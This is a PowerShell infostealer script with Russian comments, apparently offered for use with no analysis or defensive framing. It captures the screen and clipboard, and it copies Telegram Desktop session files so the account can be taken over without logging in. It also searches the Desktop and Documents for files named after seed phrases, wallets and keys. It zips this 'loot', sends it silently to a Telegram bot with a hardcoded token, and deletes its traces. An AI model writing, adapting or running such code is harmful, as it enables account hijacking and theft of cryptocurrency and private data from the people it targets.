# Конфигурация
$token = "8680192798:AAFdHwzr2HYwbGjz3gkaS5xlYjryAozMkGI"
$chatId = "1940923712"
$workDir = "$env:TEMP\assets_data"
$zipFile = "$env:TEMP\final_loot.zip"

# Создаем рабочую директорию
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

# 1. Скриншот экрана (Визуальный контроль)
try {
    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
    $bitmap.Save("$workDir\screen.png", [System.Drawing.Imaging.ImageFormat]::Png)
    $graphics.Dispose(); $bitmap.Dispose()
} catch {}

# 2. Буфер обмена (Текущие пароли/данные)
Get-Clipboard | Out-File "$workDir\clip.txt" -ErrorAction SilentlyContinue

# 3. Сбор Telegram сессии (tdata)
# Мы забираем только критические файлы для обхода авторизации
$tgPath = "$env:APPDATA\Telegram Desktop\tdata"
if (Test-Path $tgPath) {
    $tgDest = New-Item -ItemType Directory -Path "$workDir\tg_session" -Force
    # Файлы конфигурации и ключи
    Get-ChildItem $tgPath -File | Where-Object { $_.Name -match "key_datas|settings|D877F783D5D3EF8C" } | Copy-Item -Destination $tgDest
    # Папки с метаданными сессии (обычно 16-символьные имена)
    Get-ChildItem $tgPath -Directory | Where-Object { $_.Name.Length -eq 16 } | Copy-Item -Destination $tgDest -Recurse -Force
}

# 4. Поиск сид-фраз и крипто-ключей
# Ищем во всех текстовых файлах на Рабочем столе и в Документах
$searchPaths = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents")
$keywords = "seed|phrase|mnemonic|wallet|private|key|secret|bitcoin|ethereum|metamask"

foreach ($path in $searchPaths) {
    if (Test-Path $path) {
        # Копируем файлы, имена которых содержат ключи
        Get-ChildItem $path -Recurse -Include *.txt, *.docx, *.pdf, *.xlsx -ErrorAction SilentlyContinue | Where-Object { 
            $_.Name -match $keywords 
        } | Copy-Item -Destination $workDir -ErrorAction SilentlyContinue
    }
}

# 5. Упаковка и тихая отправка
try {
    if (Test-Path $zipFile) { Remove-Item $zipFile }
    Compress-Archive -Path "$workDir\*" -DestinationPath $zipFile -Force
    
    $uri = "https://api.telegram.org/bot$token/sendDocument"
    # Отправляем через curl (стандарт в Win10+)
    & curl.exe -s -X POST $uri -F "chat_id=$chatId" -F "document=@$zipFile" -F "caption=Assets collected: Screen + TG + Clip + CryptoSeeds" | Out-Null
} catch {}

# Очистка следов (обязательно для выживания)
Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipFile -Force -ErrorAction SilentlyContinue
